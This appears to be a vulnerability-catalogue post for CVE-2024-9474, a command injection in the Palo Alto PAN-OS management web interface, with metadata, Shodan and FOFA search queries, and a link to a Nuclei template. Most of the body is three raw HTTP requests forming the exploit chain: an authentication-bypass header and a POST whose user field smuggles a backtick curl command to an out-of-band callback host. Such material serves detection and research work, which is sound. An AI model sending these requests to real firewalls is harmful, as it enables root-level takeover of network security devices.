---
layout: "post"
cve_id: "CVE-2024-9474"
title: "PAN-OS Management Web Interface - Command Injection"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-9474.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9474.yaml"
author: "watchTowr,iamnoooob,rootxharsh,pdresearch"
severity: "high"
impact: "Authenticated administrators with access to the management web interface can escalate privileges to execute commands with root privileges on the PAN-OS firewall, achieving complete system control and bypassing security controls.
"
remediation: "Apply security updates from Palo Alto Networks to address the privilege escalation and command injection vulnerability in the PAN-OS management web interface.
"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 7.2, 'cve-id': 'CVE-2024-9474', 'cwe-id': 'CWE-78', 'epss-score': 0.94223, 'epss-percentile': 0.99919, 'cpe': 'cpe:2.3:o:paloaltonetworks:pan-os:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'paloaltonetworks', 'product': 'pan-os', 'shodan-query': ['cpe:"cpe:2.3:o:paloaltonetworks:pan-os"', 'http.favicon.hash:"-631559155"'], 'fofa-query': 'icon_hash="-631559155"'}"
tags:
  - "cve"
  - "cve2024"
  - "panos"
  - "rce"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A privilege escalation vulnerability in Palo Alto Networks PAN-OS software allows a PAN-OS administrator with access to the management web interface to perform actions on the firewall with root privileges.
Cloud NGFW and Prisma Access are not impacted by this vulnerability.


## üåê HTTP Request
```nohighlight
GET /php/utils/CmsGetDeviceSoftwareVersion.php/.js.map HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8
Connection: close
X-PAN-AUTHCHECK: off
Accept-Encoding: gzip
```

```nohighlight
POST /php/utils/createRemoteAppwebSession.php/icnom.js.map HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 96
Content-Type: application/x-www-form-urlencoded
X-PAN-AUTHCHECK: off
Accept-Encoding: gzip

user=`curl+d5iqrlhle0o2ts0avc304c65imj4r169x.oast.fun`&userRole=superuser&remoteHost=&vsys=vsys1
```

```nohighlight
GET /index.php/.js.map HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Cookie: PHPSESSID=JgsD5H
X-PAN-AUTHCHECK: off
Accept-Encoding: gzip
```

